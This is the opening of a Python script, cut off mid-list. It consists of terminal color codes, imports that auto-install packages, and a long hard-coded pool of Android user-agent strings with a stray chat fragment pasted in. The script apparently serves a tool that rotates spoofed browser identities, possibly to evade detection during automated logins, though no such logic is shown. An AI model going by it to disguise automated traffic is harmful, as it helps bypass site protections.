W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote
# UA LIST
#ugen2=open('frec.txt','r').read().splitlines()
#ugen=open('m.txt','r').read().splitlines()
ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen=['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG 